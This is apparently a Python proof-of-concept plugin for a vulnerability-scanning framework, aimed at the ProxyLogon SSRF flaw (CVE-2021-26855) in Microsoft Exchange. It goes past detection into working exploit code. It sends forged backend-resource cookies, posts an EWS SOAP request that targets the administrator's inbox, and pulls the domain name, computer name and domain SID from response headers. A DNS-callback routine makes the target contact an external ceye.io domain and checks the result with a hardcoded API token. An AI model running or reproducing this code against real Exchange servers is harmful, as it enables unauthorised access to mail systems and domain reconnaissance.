from datetime import date
from BasePoc import BasePoc               # 导入BasePoc，是PoC脚本实现的类中必须继承的基类
from utils import error, tree, highlight, req    # utils实现了一些常用函数，可以直接导入方便使用
from urllib.parse import urljoin
import requests
import string
import random


POC_NAME = "CVE_2021_26855_proxylogon"    # PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同


class CVE_2021_26855_proxylogon(BasePoc):

    poc_info = {
        'poc': {
            'Id': 'vb_2021_0047',    # PoC的VID编号
            'vbid': '',
            'Name': 'CVE_2021_26855_proxylogon',    # PoC名称
            'Author': 'lUc1f3r11',    # PoC作者
            'Create_date': '2021-11-3',    # PoC创建时间
            },

        'vul': {
            'Product': 'Exchange Server 需要运行 Microsoft Exchange Server 2013、2016 或 2019',    # 漏洞所在产品名称
            'Version': '',    # 产品的版本号
            'Type': 'ssrf RCE',    # 漏洞类型
            'Severity': 'high',    # 漏洞危害等级low/medium/high/critical
            'isWeb' : True,    # 是否Web漏洞
            'Description': '''
                Microsoft Exchange Server Remote Code Execution Vulnerability This CVE ID is unique from CVE-2021-26412, CVE-2021-26854, CVE-2021-26857, CVE-2021-26858, CVE-2021-27065, CVE-2021-27078.
                There exists a server-side request forgery (SSRF) vulnerability in Exchange which allows the attacker to send arbitrary HTTP requests and authenticate as the Exchange server.
            ''',    # 漏洞简要描述
            'DisclosureDate': '2021-03-03',    # PoC公布时间
        }
    }


    # scan_info信息可以保持默认，相关参数如target/mode/verbose在TCC框架中都可以通过命令行参数设置
    scan_info = {
        'Target': '',    # 目标网站域名
        'Mode': 'verify',    # verify或exploit
        'Verbose': True,    # 是否打印详细信息
        'Error': '',    # 检测失败时可用于记录相关信息
        'Success': False,    # 是否检出漏洞，若检出请更新该值为True
        'risk_category': 'sec_vul',
        'Ret': tree()    # 可用于记录额外的一些信息
    }

    test_case = {
        'Need_fb': False,
        'Vuln': [],    # 列表格式的测试URL
        'Not_vuln': [],    # 同上
    }

    def verify(self, first=False):
        # 漏洞验证方法（mode=verify）
        target = self.scan_info.get("Target", "")    # 获取测试目标
        verbose = self.scan_info.get("Verbose", False)   # 是否打印详细信息

        # 以下是PoC的检测逻辑
        url = urljoin(target,"/ecp/default.flt")

        headers = {
            'Cookie': 'X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;'
        }

        #resp = req(url, 'get', headers=header, allow_redirects=False)
        resp = requests.get(url, headers=headers, timeout=10, verify=False)
        if resp.status_code == 500 and 'NegotiateSecurityContext' in resp.text:
            self.scan_info['Success'] = True    # 漏洞存在，必须将该字段更新为True（必须）
            self.scan_info['Ret']['VerifyInfo']['URL'] = url    # 记录漏洞相关的一些额外信息（可选）
            self.scan_info['Ret']['VerifyInfo']['DATA'] = resp.text
            if verbose:
                highlight("[+] url: " + url + " 存在CVE-2021-26855 ssrf漏洞！！！")
        else:
            if verbose:
                highlight("[+] url: " + url + " 不存在CVE-2021-26855 ssrf漏洞！！！")


        def exploit1(target):
            print('[*] Target: %s'% target )
            print('[*] starting exploit checking...')
            try:
                server = target + '/owa/auth.owa'
                req = requests.post(server, verify=False)
                if not req.status_code == 400:
                    print('[-] Target is not Vuln!')
                    exit(0)
                server_name = req.headers["X-FEServer"]
                print('[*] Getting FQDN Name: %s'%(server_name))
                path_maybe_vuln = [
                '/owa/auth/auth.js', 
                '/ecp/default.flt', 
                '/ecp/main.css']
                headers = {
                'User-Agent': 'Hello-World',
                'Cookie': 'X-BEResource={FQDN}/EWS/Exchange.asmx?a=~1942062522;'.format(FQDN=server_name),
                'Connection': 'close',
                'Content-Type': 'text/xml'
                }
                payload = """<?xml version='1.0' encoding='utf-8'?>
                    <soap:Envelope
                    xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/'
                    xmlns:t='http://schemas.microsoft.com/exchange/services/2006/types'
                    xmlns:m='http://schemas.microsoft.com/exchange/services/2006/messages'
                    xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'>
                    <soap:Header>
                        <t:RequestServerVersion Version="Exchange2016" />
                    </soap:Header>
                    <soap:Body>
                        <m:FindItem Traversal='Shallow'>
                        <m:ItemShape>
                            <t:BaseShape>AllProperties</t:BaseShape>
                        </m:ItemShape>
                        <m:ParentFolderIds>
                            <t:DistinguishedFolderId Id='inbox'>
                            <t:Mailbox>
                                <t:EmailAddress>administrator@domail.local</t:EmailAddress>
                            </t:Mailbox>
                            </t:DistinguishedFolderId>
                        </m:ParentFolderIds>
                        </m:FindItem>
                    </soap:Body>
                    </soap:Envelope>
                """
                for x in path_maybe_vuln:
                    reqs = requests.post('%s/%s' %(target,x),headers=headers,data=payload, verify=False)
                    if 'MessageText' in reqs.text:
                        print('(+) Path %s is vuln to CVE-2021-26855!'%x)
                        print('(*) Getting Information Server')
                        #print(reqs.headers)
                        print('[+] Domain Name = %s'%reqs.headers["X-DiagInfo"])
                        print('[+] Computer Name = %s'%reqs.headers["X-CalculatedBETarget"].split(',')[1])
                        print('[+] Domain SID = %s'%reqs.headers["Set-Cookie"].split('X-BackEndCookie=')[1].split(';')[0])
                        break
                    elif 'The specified server version is invalid.' in reqs.text:
                        print('(+) Path %s is vuln to CVE-2021-26855!'%x)
                        print('(+) Response: The specified server version is invalid.')
                        print('(*) Getting Information Server')
                        #print(reqs.headers)
                        print('[+] Domain Name =  %s'%reqs.headers["X-DiagInfo"])
                        print('[+] Computer Name = %s'%reqs.headers["X-CalculatedBETarget"].split(',')[1])
                        print('[+] Domain SID = %s'%reqs.headers["Set-Cookie"].split('X-BackEndCookie=')[1].split(';')[0])
                        #i dont know what is that ;V
                        exit(0)
                    else:
                        print('(-) Path %s is not vuln to CVE-2021-26855!'%x)
            except Exception as e:
                print(e)
                pass

        def dnslog(target):
            print('[*] starting dnslog checking...')

            token = 'be530b0ef6618b0642ddb72079bfd1f7'
            letters = string.ascii_lowercase
            randomstr = ''.join(random.choice(letters) for x in range(9))
            baseurl = target + '/owa/auth/auth.js'
            dns_url = randomstr + '.ck7zuw.ceye.io'
            rheaders= {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0'
            }

            cookie= {
            'X-AnonResource':'true',
            'X-AnonResource-Backend': dns_url +'/ecp/default.flt?~3',
            'X-BEResource':'localhost/owa/auth/logon.aspx?~3'
            } 
            try:
                rget = requests.get(baseurl, headers=rheaders, cookies=cookie ,verify=False ,timeout=3)
            except Exception as e:
                pass 
        
            api = 'http://api.ceye.io/v1/records?token=%s&type=dns' % token
            try:
                res = requests.get(api, verify=False ,timeout=30).json()
            except Exception as e:
                print(e)
                pass    
            if  randomstr in str(res['data']):
                print('(+) %s is vuln to CVE-2021-26855!' % baseurl)
                return True
        
        exploit1(target)
        dnslog(target)

    def exploit(self, first=True):
        # 漏洞利用方法（mode=verify）
        self.verify(first=first)